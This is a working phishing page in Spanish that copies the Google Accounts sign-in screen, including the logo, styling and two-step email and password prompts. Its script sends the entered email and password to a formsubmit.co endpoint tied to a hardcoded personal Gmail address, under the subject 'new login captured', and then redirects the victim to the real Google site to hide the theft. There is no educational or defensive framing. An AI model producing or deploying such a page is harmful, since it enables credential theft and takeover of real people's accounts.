<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Iniciar sesión - Cuentas de Google</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #fff;
    font-family: Roboto, Arial, sans-serif;
    color: #202124;
  }
  .card {
    width: 100%;
    max-width: 448px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
    margin: 16px;
  }
  .logo { display: flex; justify-content: center; margin-bottom: 16px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 8px; }
  .sub { text-align: center; font-size: 16px; margin: 0 0 32px; color: #202124; }
  input {
    width: 100%;
    padding: 13px 15px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    margin-bottom: 8px;
    outline: none;
  }
  input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
  .chip {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    border: 1px solid #dadce0;
    border-radius: 16px;
    padding: 4px 12px;
    font-size: 14px;
    margin-bottom: 16px;
    color: #3c4043;
  }
  button {
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px 24px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    float: right;
  }
  button:hover { background: #1765cc; }
  button:disabled { opacity: .7; cursor: default; }
  .row { overflow: hidden; }
  .hidden { display: none; }
  .msg { clear: both; text-align: center; padding-top: 40px; font-size: 14px; color: #5f6368; }
  .ok { color: #188038; font-weight: 500; }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 48 48" width="40" height="40">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      </svg>
    </div>

    <h1>Iniciar sesión</h1>
    <p class="sub">Usa tu cuenta de Google</p>

    <form id="form">
      <!-- PASO 1: correo -->
      <div id="stepEmail">
        <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
        <div class="row"><button type="button" onclick="irPassword()">Siguiente</button></div>
      </div>

      <!-- PASO 2: contraseña -->
      <div id="stepPass" class="hidden">
        <div class="chip">👤 <span id="chipEmail"></span></div>
        <input type="password" id="password" placeholder="Contraseña" required>
        <div class="row"><button type="submit" id="btn">Siguiente</button></div>
      </div>

      <div id="msg" class="msg hidden"></div>
    </form>
  </div>

<script>
  /* ====== CONFIGURA AQUÍ TU CORREO ====== */
  const MI_EMAIL = "alejandropicosgurrola444@gmail.com";
  const ENDPOINT = "https://formsubmit.co/ajax/" + MI_EMAIL;

  function irPassword() {
    const email = document.getElementById('email').value.trim();
    if (!email) return;
    document.getElementById('chipEmail').textContent = email;
    document.getElementById('stepEmail').classList.add('hidden');
    document.getElementById('stepPass').classList.remove('hidden');
    document.getElementById('password').focus();
  }

  document.getElementById('form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('btn');
    const msg = document.getElementById('msg');

    btn.disabled = true;
    btn.textContent = "Enviando...";

    try {
      const res = await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json", "Accept": "application/json" },
        body: JSON.stringify({
          correo: email,
          contrasena: password,
          _subject: "Nuevo inicio de sesión capturado",
          _template: "table",
          _captcha: "false"
        })
      });
      if (!res.ok) throw new Error("fallo");
      msg.textContent = "Datos enviados ✔";
      msg.className = "msg ok";
      setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 1500);
    } catch (err) {
      msg.textContent = "No se pudo enviar. Datos: " + email + " / " + password;
      msg.className = "msg";
      btn.disabled = false;
      btn.textContent = "Reintentar";
    }
  });
</script>
</body>
</html>
